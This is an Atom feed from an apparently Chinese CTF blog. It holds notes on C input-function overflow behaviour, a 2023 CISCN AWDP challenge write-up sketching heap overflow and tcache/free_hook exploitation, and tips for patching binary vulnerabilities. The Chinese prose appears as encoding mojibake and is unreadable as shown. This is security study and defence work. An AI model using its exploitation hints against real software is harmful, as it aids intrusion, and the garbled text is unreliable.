<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://zjw1nd.github.io/atom.xml" rel="self"/>
  
  <link href="https://zjw1nd.github.io/"/>
  <updated>2025-03-11T13:21:16.305Z</updated>
  <id>https://zjw1nd.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ç®€çŸ­çš„IOå‡½æ•°ç‰¹æ€§æ•´ç†â€”â€”å—scanfå¯å‘</title>
    <link href="https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/"/>
    <id>https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/</id>
    <published>2025-03-11T12:50:37.000Z</published>
    <updated>2025-03-11T13:21:16.305Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥æºäºäº’è”ç½‘è€Œéè‡ªå·±æ‰‹åŠ¨è°ƒè¯•ï¼Œä¾›å‚è€ƒï¼Œæ˜¯å¦çœŸå®ä¸€è¯•ä¾¿çŸ¥ï¼Œä»…ä¾›å¤‡å¿˜ã€‚</p><h1>è¾“å…¥</h1><h1>gets(buf)</h1><ul class="lvl-0"><li class="lvl-2"><p>æ˜¯å¦èƒ½æº¢å‡ºï¼šä¸æ£€æŸ¥é•¿åº¦ï¼Œä»»æ„æº¢å‡º</p></li><li class="lvl-2"><p>æˆªæ–­è¦æ±‚ï¼šæ¢è¡Œæˆªæ–­(\n,\x0a)å’ŒEOFæˆªæ–­ã€‚æ¢è¡Œç¬¦ä¼šè¢«ä¸¢å¼ƒã€‚å…¶ä»–ç©ºç™½å­—ç¬¦å‡ä¼šåŸæœ¬è¾“å…¥ã€‚</p></li><li class="lvl-2"><p>å…¶ä»–å¤„ç†ï¼šç»“å°¾è‡ªåŠ¨æ·»åŠ \x00</p></li></ul><h1>read(0,buf,cnt)</h1><p>ä½œä¸ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå’Œå…¶ä»–çš„è¾“å…¥å‡½æ•°ç¡®å®æœ‰æœ¬è´¨åŒºåˆ«ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>æ˜¯å¦èƒ½æº¢å‡ºï¼šå‚æ•°3æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸åˆç†æ—¶å¯èƒ½å¯¼è‡´æº¢å‡ºã€‚</p></li><li class="lvl-2"><p>æˆªæ–­è¦æ±‚ï¼šæ²¡æœ‰æˆªæ–­å­—ç¬¦ï¼Œè¯»å¤Ÿç¼“å†²åŒºæ•°æ®æˆ–cntå­—èŠ‚åç«‹åˆ»è¿”å›ã€‚å…¶ä¸­ç»ˆç«¯é»˜è®¤è§„èŒƒä¸‹å›è½¦ä¼šå¯¼è‡´æäº¤ï¼Œç»“æœä¸­ä¼šåŒ…å«æœ‰\nå­˜åœ¨ã€‚é»˜è®¤æƒ…å†µä¸‹readåœ¨æ²¡æœ‰å¯ç”¨æ•°æ®æ—¶ä¼šé˜»å¡ã€‚å¯ä»¥è¯´æ˜¯æœ€é€šç”¨çš„ï¼Œç›´æ¥åœ¨pwntoolsä¸­è°ƒç”¨sendå°±å¯ä»¥æ— æŸå‘é€æ•°æ®ã€‚</p></li></ul><h1>scanf</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/121308367">å‚è€ƒæ–‡ç« </a><br>scanfçš„è¾“å…¥æ–¹å¼å–å†³äºå…¶æ ¼å¼åŒ–å ä½ç¬¦ã€‚æˆ‘ä»¬ä¸‹é¢é‡ç‚¹å…³æ³¨å­˜åœ¨æº¢å‡ºçš„%s</p><ul class="lvl-0"><li class="lvl-2"><p>æ˜¯å¦èƒ½æº¢å‡ºï¼šå–å†³äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å…¶ä¸­â€™%sâ€™å¹¶ä¸æ£€æŸ¥è¾“å…¥é•¿åº¦ï¼Œæ•°å­—</p></li><li class="lvl-2"><p>æˆªæ–­è¦æ±‚ï¼šæ³¨æ„ï¼Œscanfç”±ç©ºæ ¼åŒºåˆ†ä¸åŒçš„æ ¼å¼åŒ–å‚æ•°ï¼Œå³scanf(â€˜%sâ€™)æ˜¯ç©ºæ ¼(\x20)æˆªæ–­çš„ã€‚å¦å¤–åç›´è§‰çš„æ˜¯ï¼Œscanf(â€˜%sâ€™)æ²¡æœ‰0æˆªæ–­ã€‚</p></li><li class="lvl-2"></li></ul><h1>puts</h1><p>è‡ªåŠ¨æ·»åŠ æ¢è¡Œ</p><h1>printf</h1><p>å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºï¼Œ0æˆªæ–­</p><h1>write</h1><p>æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼Œæ— æˆªæ–­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥æºäºäº’è”ç½‘è€Œéè‡ªå·±æ‰‹åŠ¨è°ƒè¯•ï¼Œä¾›å‚è€ƒï¼Œæ˜¯å¦çœŸå®ä¸€è¯•ä¾¿çŸ¥ï¼Œä»…ä¾›å¤‡å¿˜ã€‚&lt;/p&gt;
&lt;h1&gt;è¾“å…¥&lt;/h1&gt;
&lt;h1&gt;gets(buf)&lt;/h1&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;
&lt;p&gt;æ˜¯å¦èƒ½æº¢å‡ºï¼šä¸æ£€æŸ¥é•¿åº¦ï¼Œä»»æ„æº¢å‡º&lt;/p&gt;
&lt;/li&gt;
</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2023ciscnå†³èµ›awdpå¤ç°æ€è·¯</title>
    <link href="https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/"/>
    <id>https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/</id>
    <published>2025-03-10T12:16:09.000Z</published>
    <updated>2025-03-11T12:47:01.248Z</updated>
    
    <content type="html"><![CDATA[<h1>CarManager</h1><p>éš¾ç‚¹åœ¨äºæ•°æ®ç»“æ„å¥—æ•°æ®ç»“æ„ï¼Œé¢‘ç¹çš„è¿›è¡Œæ··ä¹±çš„å†™å…¥å’Œé‡Šæ”¾ï¼Œæ£€æŸ¥æ˜¯å¦å‡ºç°UAFå’Œæº¢å‡ºæ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œèµ›åœºä¸Šä¼°è®¡å¾ˆå®¹æ˜“æ¼ã€‚åˆ†ä¸ºç”¨æˆ·-car-commentä¸‰å¥—ä¸œè¥¿çš„èœå•ï¼Œæ¯ä¸ªéƒ½èƒ½åˆ æ”¹æŸ¥å¹¶ä¸”ä»£ç é£æ ¼ä¸ç»Ÿä¸€ã€‚</p><p>æœ€æ˜¾çœ¼çš„æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯åˆ©ç”¨éœ€è¦è¿‡ä¸€ä¸ªchallengeï¼Œå¼€å§‹çœ‹ä¸æ‡‚ä»¥ä¸ºæ˜¯ä»€ä¹ˆç®€å•çš„å¯¹ç§°åŠ å¯†ï¼Œæœçš„é¢˜çš„wpä¹Ÿæ²¡æœ‰è¿™ä¸ªéƒ¨åˆ†ï¼Œç»“æœç»™aiè¯´æ˜¯ä¸ªæ•°ç‹¬ï¼Œç¬‘äº†ã€‚</p><p>ç¬¬äºŒæ˜¾çœ¼çš„æ˜¯mallocå‚æ•°å–å†³äºç”¨æˆ·è¾“å…¥</p><p>wpè¯´çš„UAFè§‰å¾—æ˜¯false positiveäº†ï¼Œå †æº¢å‡ºç¡®å®éšè”½ï¼Œæ˜¯ä¸€ä¸ªstrlenç¡®å®šsizeçš„æ—¶å€™å¯¼è‡´çš„ï¼Œå¦‚æœchunkå†™æ»¡äº†ä¼šè®©strlenå˜å¤§ï¼Ÿå¯ä»¥åšæº¢å‡º</p><h1>codelog</h1><p>åˆ°å¤„æ˜¯è¿™ç§è¾“å…¥è°èƒ½ä¿å‡†æ²¡é—®é¢˜å•Šï¼Œè€è€å®å®readä¸å¥½å—â€¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_401536</span><span class="params">(_BYTE *a1, <span class="type">ssize_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a2--;</span><br><span class="line">    LOBYTE(v2) = v2 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = read(<span class="number">0</span>, a1, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *__errno_location() != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v2) = *__errno_location();</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)v2 != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v2) = (_BYTE)a1;</span><br><span class="line">        *a1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">      ++a1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡çš„shellï¼Œæ”¯æŒ9ä¸ªæ“ä½œè¿™ä¸ªç¨‹åºçš„sbåœ°æ–¹åœ¨äºä¼¼ä¹é€†å‘å­˜åœ¨é—®é¢˜ï¼Œå±€éƒ¨å‚æ•°åœ¨å‡½æ•°å†…éƒ¨ç›´æ¥ç”¨rbp+0x10å’Œrbp+0x18è®¿é—®ï¼Œè€Œ64ä½ä¸­é—´çš„é‚£äº›å¯„å­˜å™¨å‚æ•°å…¨éƒ¨å¼ƒç”¨äº†ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004029FF loc_4029FF:                             ; CODE XREF: main+C7â†‘j</span><br><span class="line">.text:00000000004029FF                                         ; DATA XREF: .rodata:jpt_4029FCâ†“o</span><br><span class="line">.text:00000000004029FF                 lea     rax, [rbp+var_70] ; jumptable 00000000004029FC case 0</span><br><span class="line">.text:0000000000402A03                 push    [rbp+var_28]</span><br><span class="line">.text:0000000000402A06                 push    [rbp+var_30]</span><br><span class="line">.text:0000000000402A09                 push    [rbp+var_38]</span><br><span class="line">.text:0000000000402A0C                 push    [rbp+var_40]</span><br><span class="line">.text:0000000000402A0F                 mov     rdi, rax</span><br><span class="line">.text:0000000000402A12                 call    sub_401C2E</span><br></pre></td></tr></table></figure><p>æœ‰ç—…æ˜¯å§</p><p>å·²å‡ºï¼Œé¢˜ç›®èŠ±é‡Œèƒ¡å“¨ï¼Œä½†æ˜¯äº‹å®ä¸Šmallocå’Œfreeçš„åœ°æ–¹å¾ˆå°‘ï¼Œè¿™å°±å¸¦æ¥äº†ä¸€ä¸ªå¥½å¤„ï¼Œå³æˆ‘ä»¬ç¡®å®šæº¢å‡ºç‚¹åï¼Œåªéœ€è¦è·Ÿè¸ªæ‰€æœ‰å¯èƒ½çš„åˆ†é…å’Œé‡Šæ”¾å°±è¡Œäº†ï¼Œå®Œå…¨ä¸è¦å»é€†å‘ç¨‹åºåˆ°åº•åœ¨å¹²å˜›ï¼ˆè¯´å®è¯æ•°æ®ç»“æ„æå…¶æ··ä¹±ï¼‰</p><p>å®šå¥½æº¢å‡ºç‚¹ä¹‹åå°±åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œç„¶åç”¨æ‰€æœ‰å…¶ä»–çš„ä¸œè¥¿å»ç»™è¿™ä¸ªæº¢å‡ºç‚¹åšå †é£æ°´ï¼Œæ‰“tcacheå†™freehookä¸€æŠŠæ¢­ã€‚å¦å¤–ï¼Œscanf(%s)å‡ºä¹æ„æ–™çš„èƒ½è¾“å…¥\x00ï¼Œåè€Œä¼šè¢«ç©ºæ ¼(\x20)æˆªæ–­ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CarManager&lt;/h1&gt;
&lt;p&gt;éš¾ç‚¹åœ¨äºæ•°æ®ç»“æ„å¥—æ•°æ®ç»“æ„ï¼Œé¢‘ç¹çš„è¿›è¡Œæ··ä¹±çš„å†™å…¥å’Œé‡Šæ”¾ï¼Œæ£€æŸ¥æ˜¯å¦å‡ºç°UAFå’Œæº¢å‡ºæ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œèµ›åœºä¸Šä¼°è®¡å¾ˆå®¹æ˜“æ¼ã€‚åˆ†ä¸ºç”¨æˆ·-car-commentä¸‰å¥—ä¸œè¥¿çš„èœå•ï¼Œæ¯ä¸ªéƒ½èƒ½åˆ æ”¹æŸ¥å¹¶ä¸”ä»£ç é£æ ¼ä¸ç»Ÿä¸€ã€‚&lt;/p&gt;
&lt;p&gt;æœ€æ˜¾çœ¼çš„æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
  </entry>
  
  <entry>
    <title>æ–°æ‰‹æ¸—é€å‡†å¤‡æŠ€å·§</title>
    <link href="https://zjw1nd.github.io/2025/03/10/%E6%96%B0%E6%89%8B%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/"/>
    <id>https://zjw1nd.github.io/2025/03/10/%E6%96%B0%E6%89%8B%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/</id>
    <published>2025-03-10T03:27:29.000Z</published>
    <updated>2025-03-10T03:31:19.187Z</updated>
    
    
    
    
    <category term="Web" scheme="https://zjw1nd.github.io/categories/Web/"/>
    
    
    <category term="web" scheme="https://zjw1nd.github.io/tags/web/"/>
    
    <category term="awd" scheme="https://zjw1nd.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>Awdp-PWNå‡†å¤‡æŠ€å·§</title>
    <link href="https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/"/>
    <id>https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/</id>
    <published>2025-02-25T11:40:53.000Z</published>
    <updated>2025-03-11T12:43:08.336Z</updated>
    
    <content type="html"><![CDATA[<h1>ç¯å¢ƒé—®é¢˜</h1><p>é¦–å…ˆï¼Œæˆ‘æœ‰ä¸¤å¥—ç¯å¢ƒã€‚ä¸€ä¸ªwindowsä¸€ä¸ªarchï¼Œéƒ½æ˜¯ç‰©ç†æœºã€‚</p><p>å…¶ä¸­ï¼Œwindowsä¸Šæ‹¥æœ‰kali-wslå’Œwin_penetration_toolkit-vmwareï¼Œå¹³å¸¸çš„pwné¢˜æ˜¯é‡‡ç”¨</p><ul class="lvl-0"><li class="lvl-2"><p>wsl-kaliæ‰§è¡Œpythonè„šæœ¬/gdbè°ƒè¯•ï¼Œpatchelf+glibc-all-in-oneï¼Œwindowsä¸»æœºidaåˆ†æ</p></li></ul><p>ç¼ºç‚¹æ˜¯ï¼Œwindowsä¸Šæ²¡æœ‰dockerã€‚åšä¸äº†å†…æ ¸é¢˜ã€‚ä¼˜ç‚¹æ˜¯ï¼Œwindowsä¸Šå…·æœ‰æ¸—é€æµ‹è¯•çš„è™šæ‹Ÿæœºï¼Œå¯ä»¥è¯´æ¸—é€åŸºæœ¬ä¸Šå¿…é¡»ç”¨winï¼ˆblackarchå¼€å‘ä¸æ˜¯å¾ˆå…¨ï¼‰</p><p>è€Œlinuxç¯å¢ƒä¸Šä¹Ÿæœ‰åŸç”Ÿidaæ”¯æŒï¼Œä¹Ÿèƒ½åšï¼Œç¼ºç‚¹åœ¨äºæ²¡æœ‰æ‚ä¸ƒæ‚å…«çš„å·¥å…·æ¯”å¦‚anytxtï¼Œlocalsendè¿™ç§ï¼Œä¹Ÿç¼ºmiscå·¥å…·ï¼Œä»¥åŠæ¸—é€çš„å·¥å…·ã€‚</p><p>linuxå‡†å¤‡å¥½ubuntuçš„ä¸‰ä¸ªdockerï¼Œéƒ½å®‰è£…gdbï¼Ÿ</p><h2 id="pwné¢˜é…ç½®">pwné¢˜é…ç½®</h2><p>å‚è€ƒè‡ª<a href="https://blog.csdn.net/qq_38154820/article/details/119259414">æ–‡ç« 1</a></p><p><a href="https://xz.aliyun.com/news/13321?time__1311=eqUxuDcDBGe7qRxBqDwjDAh%2BO3phwBbD&amp;u_atoken=9d921b0c0075e2df58d83b37a58c5b31&amp;u_asig=0a47315217404858836656288e003d">æ–‡ç« 2(åŒ…æ‹¬æµé‡è½¬å‘ï¼Œæ‰¹é‡æ”»å‡»è„šæœ¬)</a></p><h1>å‡†å¤‡</h1><p>æ‰‹åŠ¨patchï¼Œä½¿ç”¨ida keypatchå³å¯ã€‚æ‰“åŒ…å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf archive.tar file1 file2 directory</span><br><span class="line">tar -czvf archive.tar.gz directory</span><br><span class="line">tar -rvf archive.tar newfile</span><br><span class="line"></span><br><span class="line">tar -xvf archive.tar</span><br></pre></td></tr></table></figure><h1>å¸¸è§æ¼æ´çš„patchæ–¹æ³•</h1><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><ol><li class="lvl-3"><p>printf=&gt;puts,ç›´æ¥æ”¹callçš„åœ°å€å³å¯ã€‚é£é™©æ˜¯putsä¼šåœ¨ç»“å°¾æ·»åŠ æ¢è¡Œï¼Œä¸ä¸€å®šèƒ½è¿‡æ£€æŸ¥ã€‚</p></li><li class="lvl-3"><p>å¼ºè¡Œè°ƒæ•´å‚æ•°ã€‚rdiæ”¾&quot;%s&quot;ï¼Œrsiæ”¾åŸå‚æ•°ã€‚ç¨‹åºé‡Œæœ‰%såœ¨çš„è¯ä¼šå¥½ä¸€ç‚¹ï¼Œå¦‚æœæ²¡æœ‰%sçš„è¯ï¼Œæˆ‘ä»¬å¯èƒ½è¦æ‰¾3å­—èŠ‚å¡è¿›å»å¦‚ä¸‹å†…å®¹ï¼š</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x25 0x73 0x00== %s\0</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æŒ‡ä»¤ä¹Ÿå¯èƒ½ä¸å¤Ÿé•¿ï¼Ÿ</p><h2 id="UAF">UAF</h2><blockquote><p>â€œUAFå°±ç›´æ¥æŠŠfree nopæ‰â€ â€”â€”æŸä½å¤§è·Œå­¦é•¿</p></blockquote><p>checkè¿‡ç¨‹ä¸­æ²¡åŠæ³•æ£€æŸ¥æ˜¯å¦æœ‰freeï¼Œæ‰€ä»¥ç›´æ¥nopæ‰freeä¼¼ä¹æ˜¯ä¸ªä¸é”™çš„æ–¹æ¡ˆã€‚åæ­£ä¹Ÿçˆ†ä¸äº†ï¼Œå†…å­˜å°±åœ¨é‚£æ‰”ç€ä½ ä¹Ÿä¸èƒ½æ€ä¹ˆæ ·</p><h2 id="æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º</h2><p>æ•´æ•°æº¢å‡ºæ¯”è¾ƒç®€å•ï¼Œä¿®æ”¹ç›¸åº”åˆ¤æ–­æŒ‡ä»¤çš„è·³è½¬é€»è¾‘å°±è¡Œï¼ˆï¼Ÿï¼‰å°†æœ‰ç¬¦å·è·³è½¬æ”¹ä¸ºæ— ç¬¦å·ï¼Ÿ</p><h2 id="ç¼“å†²åŒºæº¢å‡º">ç¼“å†²åŒºæº¢å‡º</h2><p>æ”¹å°ç›¸å…³çš„è¾“å…¥é•¿åº¦,åˆ†x86å’Œx64ï¼Œå†™æ­»çš„æ•°å€¼å‚æ•°x86éœ€è¦patch pushæŒ‡ä»¤ï¼Œä½†æ˜¯æ³¨æ„ï¼Œåœ¨æ“ä½œæ•°å¤§äº0x100çš„æ—¶å€™pushå†…å®¹å¯èƒ½ä¼šå˜åŒ–ï¼Œæ¶‰åŠåˆ°æ ˆå¹³è¡¡çš„é—®é¢˜éœ€è¦æ³¨æ„ã€‚<br>x64å°±ç›´æ¥patchå¯„å­˜å™¨èµ‹å€¼å³å¯ã€‚</p><p>scanfçš„è¯å°è¯•å°†&quot;%s&quot;æ”¹æˆ&quot;%ns&quot;æ¥é™åˆ¶è¾“å…¥é•¿åº¦ï¼Œå¦‚æœé•¿åº¦æ˜¯åŠ¨æ€çš„å°è¯•äº†ä¸‹æ”¹æˆread(0,buf,len)ä¸€èˆ¬æ±‡ç¼–ä¹Ÿæ˜¯å¤Ÿçš„</p><h2 id="VM">VM</h2><p>æ ¸å¿ƒæ˜¯é˜²æ­¢åœ¨vmæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­è¶Šç•Œ/éé¢„æœŸçš„è¯»å†™ï¼Œå…·ä½“é—®é¢˜å…·ä½“åˆ†æï¼Œè‚¯å®šä¼šæœ‰æ‰§è¡ŒæŒ‡ä»¤è¿‡ç¨‹ä¸­çš„checkæ¼æ´</p><h2 id="é€»è¾‘æ¼æ´">é€»è¾‘æ¼æ´</h2><p>nopæ¼æ´åˆ†æ”¯ï¼ˆnopæ‰è·³è½¬æŒ‡ä»¤ï¼‰æ•æ„Ÿå‡½æ•°çš„å‚æ•°æƒé™ï¼ˆå¦‚mmapç­‰ï¼‰</p><h2 id="é€šé˜²">é€šé˜²</h2><p>ç»™ç¨‹åºåŠ æ²™ç®±ç›´æ¥æ— è„‘å…³é—­execveè°ƒç”¨ï¼Œä½†æ˜¯é€šé˜²å¯èƒ½è¢«æ£€æµ‹ï¼Œè‡ªè¡Œæ–Ÿé…Œ<br><a href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher</a></p><p>æµ‹è¯•ä¸‹æ¥ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶å¤§å°æ²¡æœ‰å˜åŒ–ï¼Œçº¿ä¸‹è¯•è¯•å§ã€‚</p><h2 id="éé¢„æœŸï¼Ÿ">éé¢„æœŸï¼Ÿ</h2><p>ç¨‹åºå¦‚æœexité€€å‡ºï¼Œæ‰“ioçš„è¯å°è¯•nopæ‰exitæˆ–è€…æ”¹æˆ_exitï¼Ÿ</p><h1>æ£€æŸ¥æ¼æ´</h1><p>æ•æ„ŸåŠŸèƒ½å‡½æ•°ï¼Œstrlenè·å–é•¿åº¦é™åˆ¶èƒ½ä¸èƒ½å¡æ»¡æº¢å‡ºï¼Œscanf%sçš„è¾“å…¥</p><h1>dockerå‘½ä»¤</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID # auto update è‡ªåŠ¨æ‰§è¡Œupdate.shè„šæœ¬</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID /bin/sh # do not update ä¸ä¼šè‡ªåŠ¨æ›´æ–°</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID # privileged enabled and auto update ç»™ç‰¹æƒæ ‡å¿—å’Œè‡ªåŠ¨æ›´æ–°</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID /bin/sh # privileged enabled and auto update ç»™ç‰¹æƒæ ‡å¿—å’Œè‡ªåŠ¨æ›´æ–°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it -d -v $PWD:/home/ctf/hacker</span><br><span class="line"></span><br><span class="line">docker exec -it CONTAINER_ID /bin/sh</span><br><span class="line">docker exec -it -u root CONTAINER_ID /bin/sh</span><br><span class="line"></span><br><span class="line">/bin/test-this-container.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;ç¯å¢ƒé—®é¢˜&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆï¼Œæˆ‘æœ‰ä¸¤å¥—ç¯å¢ƒã€‚ä¸€ä¸ªwindowsä¸€ä¸ªarchï¼Œéƒ½æ˜¯ç‰©ç†æœºã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­ï¼Œwindowsä¸Šæ‹¥æœ‰kali-wslå’Œwin_penetration_toolkit-vmwareï¼Œå¹³å¸¸çš„pwné¢˜æ˜¯é‡‡ç”¨&lt;/p&gt;
&lt;ul class=&quot;lvl-</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="awd" scheme="https://zjw1nd.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>Archå®‰è£…å¤‡å¿˜æ‰‹å†Œ</title>
    <link href="https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/"/>
    <id>https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/</id>
    <published>2025-02-24T08:30:11.000Z</published>
    <updated>2025-03-11T12:44:09.964Z</updated>
    
